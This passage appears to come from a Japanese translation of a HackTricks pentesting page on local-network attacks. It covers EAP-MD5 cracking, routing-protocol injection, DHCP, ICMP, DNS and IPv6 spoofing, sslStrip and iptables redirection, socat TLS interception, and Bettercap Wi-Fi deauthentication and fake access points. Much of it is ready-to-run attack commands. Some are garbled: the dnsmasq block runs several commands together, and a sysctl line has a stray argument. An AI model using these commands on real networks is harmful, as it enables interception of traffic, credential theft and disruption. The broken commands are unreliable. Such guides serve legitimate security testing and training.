| WPAD構成アドレス（URL）                      | _-w “[http://10.0.0.100/wpad.dat\n”](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| デフォルトゲートウェイIPアドレスをスプーフィング | -S                                                                           |
| すべてのDHCPリクエストに応答する（非常にノイジー） | -R                                                                           |

### **EAP攻撃**

802.1X実装に対して使用できる攻撃戦術のいくつかは次のとおりです：

* EAPを介したアクティブな総当たりパスワード攻撃
* 異常なEAPコンテンツを使用してRADIUSサーバーを攻撃する _\*\*_(exploits)
* EAPメッセージのキャプチャとオフラインパスワードクラッキング（EAP-MD5およびPEAP）
* EAP-MD5認証を強制してTLS証明書の検証をバイパスする
* ハブまたは類似のものを使用して認証後に悪意のあるネットワークトラフィックを注入する

攻撃者が被害者と認証サーバーの間にいる場合、必要に応じて認証プロトコルをEAP-MD5に劣化させ、認証試行をキャプチャしようとするかもしれません。その後、これを総当たり攻撃してください：
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP（GLBP＆HSRP）攻撃 <a href="#6196" id="6196"></a>

**FHRP**（First Hop Redundancy Protocol）は、**ホット冗長ルーティングシステムを作成**するために設計されたネットワークプロトコルのクラスです。FHRPを使用すると、物理ルーターを1つの論理デバイスに組み合わせることができ、信頼性を向上させ負荷を分散するのに役立ちます。

**Cisco Systemsのエンジニアは、GLBPとHSRPの2つのFHRPプロトコルを開発しました。**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

ルーティング情報プロトコル（RIP）には、RIP、RIPv2、RIPngの3つのバージョンが存在します。RIPとRIPv2は、ポート520を介してピアに送信されるUDPデータグラムを使用し、一方、RIPngはIPv6マルチキャストを介してUDPポート521にデータグラムをブロードキャストします。RIPv2はMD5認証サポートを導入しました。RIPngにはネイティブ認証が組み込まれておらず、代わりにIPv6内のオプションのIPsec AHおよびESPヘッダーに依存しています。

このプロトコルを攻撃する方法の詳細については、書籍_**「Network Security Assessment: Know Your Network（第3版）」**_を参照してください。

### EIGRP攻撃

**EIGRP（Enhanced Interior Gateway Routing Protocol）**は、動的ルーティングプロトコルです。**距離ベクトルプロトコル**です。**認証がない**場合やパッシブインターフェースの構成がない場合、**侵入者**はEIGRPルーティングに干渉し、**ルーティングテーブルの毒化**を引き起こす可能性があります。さらに、EIGRPネットワーク（つまり、自律システム）**はフラットで、ゾーンに分割されていません**。**攻撃者がルートを注入**すると、このルートが自律EIGRPシステム全体に**広がる**可能性があります。

EIGRPシステムを攻撃するには、**正当なEIGRPルーターとの隣接関係を確立**する必要があり、これにより基本的な偵察からさまざまなインジェクションまでさまざまな可能性が開かれます。

\*\*\*\*[**FRRouting**](https://frrouting.org/)を使用すると、**BGP、OSPF、EIGRP、RIPなどのプロトコルをサポートする仮想ルーター**を実装できます。必要なのは、それを攻撃者のシステムに展開するだけで、実際にはルーティングドメイン内の正当なルーターであるかのように振る舞うことができます。

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/)もEIGRPブロードキャストのキャプチャとルーティング構成を操作するためのパケットのインジェクションをサポートしています。Colyを使用して攻撃する方法の詳細については、_**「Network Security Assessment: Know Your Network（第3版）」**_を参照してください。

### OSPF

ほとんどのOpen Shortest Path First（OSPF）実装では、ルーター間の認証を提供するためにMD5を使用しています。LokiとJohn the Ripperは、MD5ハッシュをキャプチャして攻撃し、キーを明らかにし、新しいルートを広告するために使用できます。ルートパラメータは、_Injection_タブを使用して設定し、キーは_Connection_の下で設定されます。

このプロトコルを攻撃する方法の詳細については、書籍_**「Network Security Assessment: Know Your Network（第3版）」**_を参照してください。

### その他の一般的なツールとソース

* [**Above**](https://github.com/c4s73r/Above): ネットワークトラフィックをスキャンして脆弱性を見つけるツール
* ネットワーク攻撃に関する詳細は[こちら](https://github.com/Sab0tag3d/MITM-cheatsheet)を参照してください。 _(TODO: すべてを読んで、新しい攻撃があればすべてを読んでください)_

## **スプーフィング**

攻撃者は、偽のDHCP応答を送信してネットワークの新しいメンバーのすべてのネットワークパラメータ（GW、IP、DNS）を構成します。
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARPスプーフィング

[前のセクション](./#arp-spoofing)を参照してください。

### ICMPリダイレクト

ICMPリダイレクトは、ICMPパケットタイプ1コード5を送信することで、攻撃者がIPに到達する最良の方法であることを示すものです。その後、被害者がIPに連絡しようとすると、パケットは攻撃者を介して送信されます。
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNSスプーフィング

攻撃者は、被害者が要求するドメインのいくつか（またはすべて）を解決します。
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasqを使用して独自のDNSを設定する**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### ローカルゲートウェイ

システムやネットワークへの複数の経路が存在することがよくあります。ローカルネットワーク内のMACアドレスのリストを作成した後、_gateway-finder.py_ を使用してIPv4フォワーディングをサポートするホストを特定します。
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [LLMNR、NBT-NS、およびmDNSのスプーフィング](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Microsoftシステムでは、DNSルックアップが失敗した場合に、リンクローカルマルチキャスト名解決（LLMNR）とNetBIOS名前サービス（NBT-NS）を使用して、ローカルホストの解決を行います。Apple BonjourおよびLinuxゼロ構成実装では、マルチキャストDNS（mDNS）を使用してネットワーク内のシステムを検出します。これらのプロトコルは認証されず、UDP経由でメッセージをブロードキャストするため、攻撃者はこれらを悪用してユーザーを悪意のあるサービスに誘導することができます。

Responderを使用して、ホストが検索するサービスを偽の応答を送信することで、サービスを偽装することができます。\
[Responderを使用したサービスの偽装方法](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)に関する詳細情報はこちらを参照してください。

### [WPADのスプーフィング](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

多くのブラウザは、ネットワークからプロキシ設定を読み込むためにWeb Proxy Auto-Discovery（WPAD）を使用します。WPADサーバーは、次のいずれかを通じて識別されると、特定のURL（たとえば、[http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)）を介してクライアントプロキシ設定を提供します。

* DHCP、コード252エントリを使用[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* ローカルドメインで_wpad_ホスト名を検索するDNS
* Microsoft LLMNRおよびNBT-NS（DNS検索が失敗した場合）

ResponderはWPAD攻撃を自動化し、DHCP、DNS、LLMNR、およびNBT-NSを介してクライアントを悪意のあるWPADサーバーに誘導するプロキシを実行します。\
[Responderを使用したサービスの偽装方法](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)に関する詳細情報はこちらを参照してください。

### [SSDPおよびUPnPデバイスのスプーフィング](spoofing-ssdp-and-upnp-devices.md)

ネットワーク内で異なるサービスを提供して、ユーザーを騙して平文の資格情報を入力させることができます。\
この攻撃に関する詳細情報は[SSDPおよびUPnPデバイスのスプーフィング](spoofing-ssdp-and-upnp-devices.md)にあります。

### IPv6ネイバースプーフィング

この攻撃はARPスプーフィングに非常に似ていますが、IPv6の世界で行われます。被害者がIPv6のGWのMACアドレスが攻撃者のものであると思わせることができます。
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6ルーター広告のスプーフィング/フラッディング

一部のOSは、ネットワーク内で送信されたRAパケットからデフォルトでゲートウェイを構成します。攻撃者をIPv6ルーターとして宣言するためには、次のコマンドを使用できます：
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCPスプーフィング

デフォルトでは、一部のOSはネットワーク内のDHCPv6パケットを読み取ってDNSを構成しようとします。そのため、攻撃者は自分自身をDNSとして構成するためにDHCPv6パケットを送信することができます。DHCPはまた、被害者にIPv6を提供します。
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (フェイクページとJSコードの挿入)

## インターネット攻撃

### sslStrip

この攻撃が行うことは、**ユーザー**が**HTTP**ページに**アクセス**しようとする場合、そのページが**HTTPS**バージョンに**リダイレクト**されている場合に、**sslStrip**が**クライアントと**の間で**HTTP接続を維持**し、**サーバーと**の間で**HTTPS接続を確立**することです。これにより、接続を**平文**で**嗅ぎ取る**ことができます。
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
詳細は[こちら](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)。

### HSTSをバイパスするためのsslStrip+およびdns2proxy

**sslStrip+とdns2proxy**と**sslStrip**の**違い**は、例えば_**www.facebook.com**_を_**wwww.facebook.com**_（**w**が**追加**された）に**リダイレクト**し、このドメインの**アドレスを攻撃者IPに設定**することです。これにより、**クライアント**は_**wwww.facebook.com**_（攻撃者）に**接続**しますが、裏では**sslstrip+**が**https**を介して**www.facebook.com**と**実際の接続**を**維持**します。

この技術の**目的**は、_**wwww**.facebook.com_がブラウザの**キャッシュ**に保存されないため、ブラウザが**HTTPでfacebook認証を実行**するように騙すことです。\
この攻撃を実行するには、被害者が最初に[http://www.faceook.com](http://www.faceook.com)にアクセスしようとする必要があり、httpsではないことに注意してください。これは、httpページ内のリンクを変更することで行うことができます。

詳細は[こちら](https://www.bettercap.org/legacy/#hsts-bypass)、[こちら](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014)、および[こちら](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)。

**sslStripまたはsslStrip+はもはや機能しません。これは、ブラウザに事前保存されたHSTSルールがあるためです。したがって、ユーザーが"重要な"ドメインに初めてアクセスする場合でも、HTTPSでアクセスします。また、事前保存されたルールと他の生成されたルールには、**`includeSubdomains`**フラグを使用できることに注意してください。そのため、以前の_**wwww.facebook.com**_の例は機能しなくなります。_**facebook.com**_は`includeSubdomains`を使用してHSTSを使用しているためです。

TODO: easy-creds、evilgrade、metasploit、factory

## ポートでのTCPリッスン
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL ポートでのリッスン

#### キーと自己署名証明書の生成
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 証明書を使用してリッスン
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 証明書を使用してホストにリダイレクトする
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
クライアントがCAが有効であるかどうかをチェックする場合、**CAによって署名された他のホスト名の証明書を提供**することがあります。\
もう1つの興味深いテストは、**リクエストされたホスト名の証明書を自己署名**で提供することです。

他にテストすることは、有効なCAでない有効な証明書で証明書に署名しようとすることです。また、有効な公開鍵を使用して証明書に署名し、ディフィー・ヘルマンなどのアルゴリズムを使用するように強制し、クライアントが実際の秘密鍵で何も復号化する必要がないアルゴリズムを使用し、クライアントが実際の秘密鍵のプローブ（ハッシュなど）を要求するときに偽のプローブを送信し、クライアントがこれをチェックしないことを期待することです。

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### アクティブディスカバリーノート

UDPパケットが要求されたポートを持たないデバイスに送信されると、ICMP（ポート到達不能）が送信されることに注意してください。

### **ARPディスカバー**

ARPパケットはネットワーク内で使用されているIPアドレスを発見するために使用されます。PCは各可能なIPアドレスに対してリクエストを送信し、使用されているものだけが応答します。

### **mDNS（マルチキャストDNS）**

Bettercapは、**\_services\_.dns-sd.\_udp.local**を要求するMDNSリクエスト（X msごと）を送信します。このパケットを見たマシンは通常、このリクエストに応答します。その後、"services"に応答するマシンのみを検索します。

**ツール**

* Avahi-browser（--all）
* Bettercap（net.probe.mdns）
* Responder

### **NBNS（NetBios Name Server）**

Bettercapは、名前「CKAAAAAAAAAAAAAAAAAAAAAAAAAAA」を要求するためにポート137/UDPにブロードキャストパケットを送信します。

### **SSDP（シンプルサービスディスカバリープロトコル）**

Bettercapは、すべての種類のサービスを検索するためにSSDPパケットをブロードキャストします（UDPポート1900）。

### **WSD（Webサービスディスカバリー）**

Bettercapは、サービスを検索するためにWSDパケットをブロードキャストします（UDPポート3702）。

## 参考文献

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**バグバウンティのヒント**: **Intigriti**に**サインアップ**して、ハッカーによって作成されたプレミアム**バグバウンティプラットフォーム**である**Intigriti**に参加しましょう！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksをPDFでダウンロード**したり、**HackTricksで企業を宣伝**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォロー**する
* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>
